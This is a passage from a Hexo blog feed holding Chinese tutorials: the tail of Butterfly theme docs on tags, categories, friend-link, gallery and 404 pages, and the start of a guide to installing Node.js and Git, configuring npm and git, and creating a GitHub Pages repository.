"tags"</span><br><span>orderby: random</span><br><span><span>order: 1</span></span><br><span><span>---</span></span><br></pre></td></tr></tbody></table><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>type</td><td>【必须】页面类型，必须为 <code>tags</code></td></tr><tr><td>orderby</td><td>【可选】排序方式 ：random&#x2F;name&#x2F;length</td></tr><tr><td>order</td><td>【可选】排序次序： 1, asc for ascending; -1, desc for descending</td></tr></tbody></table><h2 id="分类页"><a href="#分类页" class="headerlink" title="分类页"></a><a href="https://butterfly.js.org/posts/dc584b87/#%E5%88%86%E9%A1%9E%E9%A0%81" title="分类页"></a>分类页</h2><ol><li><p>前往你的 Hexo 博客的根目录</p></li><li><p>输入 <code>hexo new page categories</code></p></li><li><p>你会找到 <code>source/categories/index.md</code> 这个文件</p></li><li><p>修改这个文件：</p><p><strong>记得添加 <code>type: &quot;categories&quot;</code></strong></p></li></ol><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span>---</span><br><span>title: 分类</span><br><span>date: 2018-01-05 00:00:00</span><br><span><span>type: "categories"</span></span><br><span><span>---</span></span><br></pre></td></tr></tbody></table><h2 id="友情链接"><a href="#友情链接" class="headerlink" title="友情链接"></a><a href="https://butterfly.js.org/posts/dc584b87/#%E5%8F%8B%E6%83%85%E9%8F%88%E6%8E%A5" title="友情链接"></a>友情链接</h2><p>为你的博客创建一个友情链接！</p><h3 id="创建友情链接页面"><a href="#创建友情链接页面" class="headerlink" title="创建友情链接页面"></a><a href="https://butterfly.js.org/posts/dc584b87/#%E5%89%B5%E5%BB%BA%E5%8F%8B%E6%83%85%E9%8F%88%E6%8E%A5%E9%A0%81%E9%9D%A2" title="创建友情链接页面"></a>创建友情链接页面</h3><ol><li><p>前往你的 Hexo 博客的根目录</p></li><li><p>输入 <code>hexo new page link</code></p></li><li><p>你会找到 <code>source/link/index.md</code> 这个文件</p></li><li><p>修改这个文件：</p><p>记得添加 <code>type: &quot;link&quot;</code></p></li></ol><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span>---</span><br><span>title: 友情链接</span><br><span>date: 2018-06-07 22:17:49</span><br><span><span>type: "link"</span></span><br><span><span>---</span></span><br></pre></td></tr></tbody></table><h3 id="友情链接添加"><a href="#友情链接添加" class="headerlink" title="友情链接添加"></a><a href="https://butterfly.js.org/posts/dc584b87/#%E5%8F%8B%E6%83%85%E9%8F%88%E6%8E%A5%E6%B7%BB%E5%8A%A0" title="友情链接添加"></a>友情链接添加</h3><p>在Hexo博客目录中的 <code>source/_data</code>（如果没有 _data 文件夹，请自行创建），创建一个文件 <code>link.yml</code></p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></pre></td><td><pre><span><span>-</span> <span>class_name:</span> <span>友情链接</span></span><br><span>  <span>class_desc:</span> <span>那些人，那些事</span></span><br><span>  <span>link_list:</span></span><br><span>    <span>-</span> <span>name:</span> <span>Hexo</span></span><br><span>      <span>link:</span> <span>https://hexo.io/zh-tw/</span></span><br><span>      <span>avatar:</span> <span>https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg</span></span><br><span>      <span>descr:</span> <span>快速、简单且强大的网志框架</span></span><br><span></span><br><span><span>-</span> <span>class_name:</span> <span>网站</span></span><br><span>  <span>class_desc:</span> <span>值得推荐的网站</span></span><br><span>  <span>link_list:</span></span><br><span>    <span>-</span> <span>name:</span> <span>Youtube</span></span><br><span>      <span>link:</span> <span>https://www.youtube.com/</span></span><br><span>      <span>avatar:</span> <span>https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png</span></span><br><span>      <span>descr:</span> <span>视频网站</span></span><br><span>    <span>-</span> <span>name:</span> <span>Weibo</span></span><br><span>      <span>link:</span> <span>https://www.weibo.com/</span></span><br><span>      <span>avatar:</span> <span>https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png</span></span><br><span>      <span>descr:</span> <span>中国最大社交分享平台</span></span><br><span>    <span>-</span> <span>name:</span> <span>Twitter</span></span><br><span>      <span>link:</span> <span>https://twitter.com/</span></span><br><span>      <span>avatar:</span> <span>https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png</span></span><br><span>      <span>descr:</span> <span>社交分享平台</span></span><br></pre></td></tr></tbody></table><p><code>class_name</code> 和 <code>class_desc</code> 支持 html 格式书写，如不需要，也可以留空。</p><h3 id="友情链接随机排序"><a href="#友情链接随机排序" class="headerlink" title="友情链接随机排序"></a><a href="https://butterfly.js.org/posts/dc584b87/#%E5%8F%8B%E6%83%85%E9%8F%88%E6%8E%A5%E9%9A%A8%E6%A9%9F%E6%8E%92%E5%BA%8F" title="友情链接随机排序"></a>友情链接随机排序</h3><p>主题支持友情链接随机排序，只需要在顶部 <code>front-matter</code> 添加 <code>random: true</code></p><h3 id="友情链接界面设置"><a href="#友情链接界面设置" class="headerlink" title="友情链接界面设置"></a><a href="https://butterfly.js.org/posts/dc584b87/#%E5%8F%8B%E6%83%85%E9%8F%88%E6%8E%A5%E7%95%8C%E9%9D%A2%E8%A8%AD%E7%BD%AE" title="友情链接界面设置"></a>友情链接界面设置</h3><p>由 2.2.0 起，友情链接界面可以由用户自己自定义，只需要在友情链接的md档设置就行，以普通的Markdown格式书写。</p><h2 id="图库"><a href="#图库" class="headerlink" title="图库"></a><a href="https://butterfly.js.org/posts/dc584b87/#%E5%9C%96%E5%BA%AB" title="图库"></a>图库</h2><p>图库页面只是普通的页面，你只需要 <code>hexo n page xxxxx</code> 创建你的页面就行</p><p>然后使用标签外挂 <a href="https://butterfly.js.org/posts/4aa8abbe/#Gallery%E7%9B%B8%E5%86%8A%E5%9C%96%E5%BA%AB">galleryGroup</a>，具体用法请查看对应的内容。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span>&lt;div</span> <span>class="gallery-group-main"&gt;</span></span><br><span>{<span>%</span> <span>galleryGroup</span> <span>'壁纸'</span> <span>'收藏的一些壁纸'</span> <span>'/Gallery/wallpaper'</span> <span>https://i.loli.net/2019/11/10/T7Mu8Aod3egmC4Q.png</span> <span>%</span>}</span><br><span>{<span>%</span> <span>galleryGroup</span> <span>'漫威'</span> <span>'关于漫威的图片'</span> <span>'/Gallery/marvel'</span> <span>https://i.loli.net/2019/12/25/8t97aVlp4hgyBGu.jpg</span> <span>%</span>}</span><br><span>{<span>%</span> <span>galleryGroup</span> <span>'OH MY GIRL'</span> <span>'关于OH MY GIRL的图片'</span> <span>'/Gallery/ohmygirl'</span> <span>https://i.loli.net/2019/12/25/hOqbQ3BIwa6KWpo.jpg</span> <span>%</span>}</span><br><span><span>&lt;/div&gt;</span></span><br></pre></td></tr></tbody></table><p><img src= "" data-lazy-src="https://butterfly.js.org/img/loading.gif" alt="Group Image Gallery"></p><p>壁纸</p><p>收藏的一些壁纸</p><p><a href="https://butterfly.js.org/Gallery/wallpaper"></a></p><p><img src= "" data-lazy-src="https://butterfly.js.org/img/loading.gif" alt="Group Image Gallery"></p><p>漫威</p><p>关于漫威的图片</p><p><a href="https://butterfly.js.org/Gallery/marvel"></a></p><p><img src= "" data-lazy-src="https://butterfly.js.org/img/loading.gif" alt="Group Image Gallery"></p><p>OH MY GIRL</p><p>关于OH MY GIRL的图片</p><p><a href="https://butterfly.js.org/Gallery/ohmygirl"></a></p><h3 id="子页面"><a href="#子页面" class="headerlink" title="子页面"></a><a href="https://butterfly.js.org/posts/dc584b87/#%E5%AD%90%E9%A0%81%E9%9D%A2" title="子页面"></a>子页面</h3><p>子页面也是普通的页面，你只需要 <code>hexo n page xxxxx</code> 创建你的页面就行</p><p>然后使用标签外挂 <a href="https://butterfly.js.org/posts/4aa8abbe/#Gallery%E7%9B%B8%E5%86%8A">gallery</a>，具体用法请查看对应的内容。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></pre></td><td><pre><span>{<span>%</span> <span>gallery</span> <span>%</span>}</span><br><span><span>![](https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg)</span></span><br><span><span>![](https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg)</span></span><br><span><span>![](https://i.loli.net/2019/12/25/gEy5Zc1Ai6VuO4N.jpg)</span></span><br><span><span>![](https://i.loli.net/2019/12/25/d6QHbytlSYO4FBG.jpg)</span></span><br><span><span>![](https://i.loli.net/2019/12/25/6nepIJ1xTgufatZ.jpg)</span></span><br><span><span>![](https://i.loli.net/2019/12/25/E7Jvr4eIPwUNmzq.jpg)</span></span><br><span><span>![](https://i.loli.net/2019/12/25/mh19anwBSWIkGlH.jpg)</span></span><br><span><span>![](https://i.loli.net/2019/12/25/2tu9JC8ewpBFagv.jpg)</span></span><br><span>{<span>%</span> <span>endgallery</span> <span>%</span>}</span><br></pre></td></tr></tbody></table><p>如果你想要使用 <code>/photo/ohmygirl</code> 这样的链接显示你的图片内容</p><p>你可以把创建好的 <code>ohmygirl</code> 整个文件夹移到 <code>photo</code> 文件夹里去</p><h2 id="404页面"><a href="#404页面" class="headerlink" title="404页面"></a><a href="https://butterfly.js.org/posts/dc584b87/#404%E9%A0%81%E9%9D%A2" title="404页面"></a>404页面</h2><p>主题内置了一个简单的 404 页面，可在设置中开启</p><p>本地预览时，访问出错的网站是不会跳到 404 页面的。</p><p>如需本地预览，请访问 <code>http://localhost:4000/404.html</code></p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span></span><br><span><span>error_404:</span></span><br><span>  <span>enable:</span> <span>true</span></span><br><span>  <span>subtitle:</span> <span>"页面没有找到"</span></span><br><span>  <span>background:</span> </span><br></pre></td></tr></tbody></table><p><a href="https://jsd.012700.xyz/gh/jerryc127/CDN/img/hexo-theme-butterfly-docs-error404.png"><img src= "" data-lazy-src="https://butterfly.js.org/img/loading.gif"></a></p><p><a href="https://butterfly.js.org/posts/4aa8abbe/" title="📌 Butterfly 安装文档(三) 主题配置">📌 Butterfly 安装文档(三) 主题配置</a></p><p>版权声明: 本部落格所有文章除特别声明外，均採用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://butterfly.js.org/">Butterfly</a>！</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建+美化（巨细版本）</title>
      <link href="/posts/4ea940d2.html"/>
      <url>/posts/4ea940d2.html</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA-%E7%BE%8E%E5%8C%96%EF%BC%88%E5%B7%A8%E7%BB%86%E7%89%88%E6%9C%AC%EF%BC%89" title="博客搭建+美化（巨细版本）"></a></h2><p>博客搭建+美化（巨细版本）</p><h3 id="一、博客环境搭建"><a href="#一、博客环境搭建" class="headerlink" title="一、博客环境搭建"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#%E4%B8%80%E3%80%81%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA" title="一、博客环境搭建"></a>一、博客环境搭建</h3><p>QQ 交流群(及文件下载):478404205</p><h4 id="1-下载Git和Node-js"><a href="#1-下载Git和Node-js" class="headerlink" title="1.下载Git和Node.js"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#1-%E4%B8%8B%E8%BD%BDGit%E5%92%8CNode-js" title="1.下载Git和Node.js"></a>1.下载Git和Node.js</h4><h5 id="1-Node-js的安装与配置"><a href="#1-Node-js的安装与配置" class="headerlink" title="1.Node.js的安装与配置"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#1-Node-js%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE" title="1.Node.js的安装与配置"></a>1.Node.js的安装与配置</h5><p>  首先去Node.js<a href="https://nodejs.org/zh-cn/">官网</a> 下载node.js的安装程序，根据你电脑系统的配置信息，下载对应的安装程序，然后开始进行下面的步骤。</p><p>  下载好与电脑系统对应的安装程序后，开始安装流程：</p><p>1.1.1 打开下载好的Node.js安装程序，点击Next，进行下一步的安装；  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/1.jpg" alt="1"></p><p><strong>1</strong></p><p>1.1.2 将”I accept the terms in the License Agreement”前面的复选框勾选，同意安装协议，再点击Next，进行下一步操作；  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/2.jpg" alt="2"></p><p><strong>2</strong></p><p>1.1.3 选择Node.js安装程序的安装位置，在这里我以”C:\Program Files\nodejs”为例，点击Next，进入下一步操作；  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/3.jpg" alt="3"></p><p><strong>3</strong></p><p>1.1.4 选择安装的模块和功能，这里全部安装，并添加到系统环境变量 ，继续点击Next，进入下一步操作；  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/4.jpg" alt="4"></p><p><strong>4</strong></p><p>1.1.5 这一步可以跳过，这个选项的意思是安装一些编译本地模块的工具，比如python，C&#x2F;C++等，点击Next，进入下一步；  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/5.jpg" alt="5"></p><p><strong>5</strong></p><p>1.1.6 点击”Install”，等待Node.js安装完成；  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/6.jpg" alt="6"></p><p><strong>6</strong></p><p>1.1.7 当看到下图所显示的情况，Node.js就成功安装完毕。  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/7.jpg" alt="7"></p><p><strong>7</strong></p><p>1.1.8 验证安装，并测试Node.js是否加入环境变量，当出现如下图的情况，Node.js安装大功告成。  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/8.jpg" alt="8"></p><p><strong>8</strong></p><p>  如果执行node -v报错的话，那么手动将Node.js的安装路径添加到环境变量中，右击点击我的电脑 -&gt;属性 -&gt; 高级系统设置 -&gt; 环境变量，在系统变量下找到名为path的变量名，如下图：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/9.jpg" alt="9"></p><p><strong>9</strong></p><p>  选中path，或者双击，然后将你node.js的安装路径放在path变量值的最后面，如果添加之前path值最后有 英文的分号，则直接将路径添加进去即可，如果没有，先添加分号，然后点击保存，回到桌面，打开cmd（Win+R），执行node -v，看是否成功。</p><p>1.1.9 设置npm的镜像源：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看npm的配置 npm config list # 默认源 npm config set registry https://registry.npmjs.org # 临时改变镜像源 npm --registry=https://registry.npm.taobao.org # 永久设置为淘宝镜像源 npm config set registry https://registry.npm.taobao.org # 另一种方式，编辑 ~/.npmrc 加入下面内容 registry = https://registry.npm.taobao.org</span></span><br></pre></td></tr></table></figure><p>1.1.10 设置npm的内置路径——&gt;全局模块路径和缓存路径（可选）<br>  如果不改变内置路径也可，除非你的C盘空间足够bigger，这一步可以略过，不改变的话，它的路径在：</p><p>npm包全局目录：C:&#x2F;Users&#x2F;[username]&#x2F;AppData&#x2F;Roaming&#x2F;npm&#x2F;node_modules<br>npm包全局命令目录：C:&#x2F;Users&#x2F;[username]&#x2F;AppData&#x2F;Roaming&#x2F;npm<br>npm实际去找全局命令的目录：C:&#x2F;Users&#x2F;[username]&#x2F;.npmrc 文件内容的prefix值<br>npm包全局cache目录：C:&#x2F;Users&#x2F;[username]&#x2F;.npmrc 文件内容的cache值</p><p>  首先在你Node.js的安装位置，新建两个文件夹，node_global和node_cache，我的路径是：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\nodejs\node_global C:\Program Files\nodejs\node_cache</span><br></pre></td></tr></table></figure><p>然后分别执行的命令就是：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> prefix<span class="string">&quot;C:\Program Files\nodejs\node_global&quot;</span> npm config <span class="built_in">set</span> cache <span class="string">&quot;C:\Program Files\nodejs\node_cache&quot;</span></span><br></pre></td></tr></table></figure><p>  然后在配置环境变量，右击我的电脑 -&gt;属性 -&gt; 高级系统设置 -&gt; 环境变量同样的位置，在用户变量的地方，找到path变量进行修改，修改值如下图：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/10.jpg" alt="10"></p><p><strong>10</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/11.jpg" alt="11"></p><p><strong>11</strong></p><p>然后就大功告成了，Node.js就安装完毕了，下面开始Git安装。👇👇👇</p><h4 id="1-2-Git的安装与配置"><a href="#1-2-Git的安装与配置" class="headerlink" title="1.2 Git的安装与配置"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#1-2-Git%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE" title="1.2 Git的安装与配置"></a>1.2 Git的安装与配置</h4><p>  首先就是去<a href="https://git-scm.com/">Git官网</a>下载Git，根据你电脑系统的配置信息，下载对应的安装程序，然后开始进行下面的步骤。  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/12.jpg" alt="12"></p><p><strong>12</strong></p><p>1.2.1 下载好Git的安装包，开始安装，打开安装包，出现如图的界面，点击Next：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/13.jpg" alt="13"></p><p><strong>13</strong></p><p>1.2.2 选择你要安装的位置，我以C盘为例，路径为图中所示，安装到其他位置的话，点击Browse，选择你要安装的位置，然后点击Next，进入下一步：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/14.jpg" alt="14"></p><p><strong>14</strong></p><p>1.2.3 选择你是否创建桌面快捷放方式，其他默认即可，点击Next，进入下一步：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/15.jpg" alt="15"></p><p><strong>15</strong></p><p>1.2.4 是否将Git快捷方式的目录加入开是菜单栏  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/16.jpg" alt="16"></p><p><strong>16</strong></p><p>1.2.5 这个是选择文本编辑器的方式，默认是Vim，也可以选择其他的方式，自主选择，在这里我选择的Vim默认方式。选择好文本编辑器的方式后，点击Next，进入下一个流程：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/17.jpg" alt="17"></p><p><strong>17</strong></p><p>1.2.6 选择安装 Git 时对环境变量PATH的影响，第一种影响较小，第三种会影响到Windows的自带工具，默认勾选中间项，建议不要修改，直接点击 “Next” 继续安装：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/18.jpg" alt="18"></p><p><strong>18</strong></p><p>1.2.7 选择 Git 在使用 HTTPS 时使用的库，若无特殊需求，可保持默认选项，点击 “Next” 继续安装：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/19.jpg" alt="19"></p><p><strong>19</strong></p><p>1.2.8 选择提交与拉取记录时，对换行符的处理方式，若无特殊需要，默认选择即可，点击 “Next” 继续安装：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/20.jpg" alt="20"></p><p><strong>20</strong></p><p>1.2.9 选择模拟终端软件（即命令行窗口软件），若无特殊需要，可默认选择，点击 “Next” 继续安装：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/21.jpg" alt="21"></p><p><strong>21</strong></p><p>1.2.10 最新功能的询问，若不想尝试尚未保证稳定性的新功能，默认不勾选，点击 “Install” 即可完成安装：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/22.jpg" alt="22"></p><p><strong>22</strong></p><p>1.2.11 安装完成  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/23.jpg" alt="23"></p><p><strong>23</strong></p><p>1.2.12 回到桌面，点击鼠标右键，会出现两个选项Git GUI Here和Git Bash Here，在打开Cmd(Win+R)，分别输入git和git –version，如果出现如下图的情况，即安装成功！  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/24.jpg" alt="24"></p><p><strong>24</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/25.jpg" alt="25"></p><p><strong>25</strong></p><h4 id="1-3-修改配置文件要用到的软件："><a href="#1-3-修改配置文件要用到的软件：" class="headerlink" title="1.3 修改配置文件要用到的软件："></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#1-3-%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%A6%81%E7%94%A8%E5%88%B0%E7%9A%84%E8%BD%AF%E4%BB%B6%EF%BC%9A" title="1.3 修改配置文件要用到的软件："></a>1.3 修改配置文件要用到的软件：</h4><p>  Visual Studio Code <a href="https://visualstudio.microsoft.com/zh-hans/">官网下载</a></p><h3 id="二、Github注册以及Github-Pages创建"><a href="#二、Github注册以及Github-Pages创建" class="headerlink" title="二、Github注册以及Github Pages创建"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#%E4%BA%8C%E3%80%81Github%E6%B3%A8%E5%86%8C%E4%BB%A5%E5%8F%8AGithub-Pages%E5%88%9B%E5%BB%BA" title="二、Github注册以及Github Pages创建"></a>二、Github注册以及Github Pages创建</h3><p>QQ 交流群(及文件下载):478404205</p><h4 id="打开Github官网"><a href="#打开Github官网" class="headerlink" title="打开Github官网"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#%E6%89%93%E5%BC%80Github%E5%AE%98%E7%BD%91" title="打开Github官网"></a>打开Github<a href="https://github.com/">官网</a></h4><p>  点击右上角的Sign Up ，然后在出现的页面上填写你的相关信息，进行注册：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/26.jpg" alt="26"></p><p><strong>26</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/27.jpg" alt="27"></p><p><strong>27</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/28.jpg" alt="28"></p><p><strong>28</strong></p><p>  验证完成后，点击Next：Select a plan，会出现如上图的验证界面，同理，只需要将其中的动物调整为正向显示即可。接着会出现下图的界面，选择Free，下方的两个选项可选可不选，点击Continue继续：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/29.jpg" alt="29"></p><p><strong>29</strong></p><p>  这时Github会给你发一封邮件，验证一下即可，验证过后才可以创建库。  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/30.jpg" alt="30"></p><p><strong>30</strong></p><p>  验证完成后，开始创建库，如下图所示，仓库名创建格式必须为：&lt;用户名&gt;.github.io，Description为描述仓库，自定义写，填写必要的描述，也可不填。勾选Initialize this repository with a README点击Creat repository进行创建。  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/31.jpg" alt="31"></p><p><strong>31</strong></p><p>  然后就会出现如图所示的界面，即仓库创建成功！  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/32.jpg" alt="32"></p><p><strong>32</strong></p><p>  我们来测试一下，点击Create new file，出现如下界面，然后命名文件名为index.html，在填写如图的内容，再点击Commit new file，即创建成功，然后打开一个新的网页，输入网址https:&#x2F;&#x2F;&lt;你的用户名&gt;.github.io，即可以看见一个新的网页，其中的内容就是你写的内容。  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/33.jpg" alt="33"></p><p><strong>33</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/34.jpg" alt="34"></p><p><strong>34</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/35.jpg" alt="35"></p><p><strong>35</strong></p><p>  至此，Github的注册以及Github Pages已经创建完成了。</p><h3 id="三、配置Git用户名和邮箱"><a href="#三、配置Git用户名和邮箱" class="headerlink" title="三、配置Git用户名和邮箱"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#%E4%B8%89%E3%80%81%E9%85%8D%E7%BD%AEGit%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E9%82%AE%E7%AE%B1" title="三、配置Git用户名和邮箱"></a>三、配置Git用户名和邮箱</h3><p>QQ 交流群(及文件下载):478404205<br>  在桌面点击鼠标右键，点击Git Bash Here，会出现一个界面如下图所示：  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/36.jpg" alt="36"></p><p><strong>36</strong></p><p>  然后分别输入下面的两个命令，并回车：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;此处填写你注册时的用户名&quot;</span> git config --global user.email <span class="string">&quot;此处填写你注册时的邮箱&quot;</span> <span class="comment"># 一般只要不报错，可以跳过下面寻找.gitconfig文件</span></span><br></pre></td></tr></table></figure><p>  然后找到.gitconfig文件，文件存放位置在C:&#x2F;Users&#x2F;[username]&#x2F;.gitconfig（未找到的话，请开启显示隐藏文件的功能），用编辑器打开，看到如下图所示的内容，即配置成功！  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/37.jpg" alt="37"></p><p><strong>37</strong></p><h3 id="四、本地安装以及发布"><a href="#四、本地安装以及发布" class="headerlink" title="四、本地安装以及发布"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#%E5%9B%9B%E3%80%81%E6%9C%AC%E5%9C%B0%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%8F%91%E5%B8%83" title="四、本地安装以及发布"></a>四、本地安装以及发布</h3><p>QQ 交流群(及文件下载):478404205</p><h4 id="1-安装到本地"><a href="#1-安装到本地" class="headerlink" title="1.安装到本地"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#1-%E5%AE%89%E8%A3%85%E5%88%B0%E6%9C%AC%E5%9C%B0" 